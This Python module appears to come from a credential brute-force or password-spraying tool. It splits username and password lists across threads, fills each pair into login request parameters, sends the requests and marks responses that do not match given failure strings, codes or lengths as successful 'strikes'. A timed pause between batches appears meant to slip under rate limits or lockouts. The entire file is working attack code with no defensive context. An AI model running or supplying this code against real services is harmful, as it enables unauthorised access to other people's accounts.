import networking, time, copy, numpy, etc
from color import *
from parsing import args

def splitlist(usernames,passwords): # splits larger list into chunks for each thread, and returns the larger list
    if len(usernames) >= len(passwords):
        usernames = numpy.array_split(usernames, args.threads);biggerlist = True
    else:
        passwords = numpy.array_split(passwords, args.threads);biggerlist = False
    return usernames, passwords, biggerlist

def attacker(usernames,passwords,params): # cycles through given credentials to find successful strikes
    threshold = args.rate[0]
    for a in usernames:
        for b in passwords:
            if threshold == 0:
                time.sleep(args.rate[1]*60)
                threshold = args.rate[0]
            threshold -= 1
            strike = True
            payload = copy.deepcopy(params)
            for key, value in payload.items():
                if value == "xuser":
                    payload[key] = a
                elif value == "xpass":
                    payload[key] = b
            code, length, content = networking.sendreq(payload)

            output = "#" + str(etc.requests).rjust(7,"0") + " " + str(code).ljust(4," ") + str(length).ljust(3," ") + " " +f"{a}:{b}"
            if args.bstr:
                for i in args.bstr:
                    if i in content.text:
                        strike = False
            if args.bcde:
                if code in args.bcde:
                    strike = False
            if args.blen:
                if length in args.blen:
                    strike = False
            if strike == True:
                etc.strikes += 1
                output = f"[{G}+{X}] " + output
                etc.strikecombos.append(output)
            else:
                output = f"[{R}-{X}] " + output
            print("|" + output.ljust(args.border+9," ") + "|")

            